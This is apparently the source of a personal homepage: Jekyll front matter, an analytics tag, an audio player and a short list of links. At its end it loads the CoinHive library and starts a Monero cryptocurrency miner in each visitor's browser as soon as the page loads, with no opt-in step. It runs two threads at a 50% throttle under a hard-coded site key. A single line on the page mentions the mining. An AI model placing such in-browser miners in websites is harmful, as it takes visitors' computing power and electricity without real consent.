---
layout:
---
<!-- Global Site Tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-106946514-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments)};
  gtag('js', new Date());
  gtag('config', 'UA-106946514-1');
</script>

under construction<br>

<!--Omniscient omnipotent and deeply unfriendly full stack developer. <br>
[Add](mailto:bohadi@users.noreply.github.com) me to your team today!
<br>
-->

<audio width="400" height="40" controls controlsList="nodownload">
  <source src="noodle.mp3" type="audio/mpeg">
</audio>

[interactive graphics](/smb) with WebGL!
<br><br>

some links:<br>
[news.ycombinator.com](https://news.ycombinator.com)<br>
[cryptowat.ch](https://cryptowat.ch)<br>
[sep/random](https://plato.stanford.edu/cgi-bin/encyclopedia/random)<br>
[The Travels of Marco Polo](https://en.wikisource.org/wiki/The_Travels_of_Marco_Polo)<br>
[Somnium, by Kepler](https://somniumproject.wordpress.com/somnium)<br>
[Vera Historia, by Lucian of Samosata](http://lucianofsamosata.info/TheTrueHistory.html)<br>

<br>
This page mines [Monero](https://en.wikipedia.org/wiki/Monero_(cryptocurrency)) in the background.<br>
This may be an alternative to serving ads and you may have to disable adblock. 
<br>
<div id='minerstatus'>
Attempting to connect...
</div>
<div id='minerio'>
Hashes/second: 0   <br>
total Hashes: 0    <br>
</div>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  var minerstatus = document.getElementById('minerstatus');
  var minerio     = document.getElementById('minerio');
  try {
    var miner = new CoinHive.Anonymous('A9pTI4370gQQt0dRaNJFmFnPXXDvsEwS', {
      threads: 2,
      throttle: 0.5
    });
    miner.start();
  }
  catch (e) { minerstatus.innerHTML = '...Connection error. Miner stopping.'; }

  miner.on('open', function() {
    minerstatus.innerHTML = 'Connection opened...';
  });
  miner.on('error', function() {
    minerstatus.innerHTML = '...Connection error. Miner stopping.';
    miner.stop();
  });
  miner.on('accepted', function() {
    minerstatus.innerHTML =
      'Connected. ('+miner.getNumThreads()+' threads throttled at '+
      100*miner.getThrottle().toFixed(2)+'% WASM supported: '+miner.hasWASMSupport()+')';
  });
  setInterval(function() {
    minerio.innerHTML = 
      'Hashes/second: '   + miner.getHashesPerSecond().toFixed(2) + '<br>' +
      'total Hashes: '    + miner.getTotalHashes()                + '<br>' ;
  }, 1000);
</script>
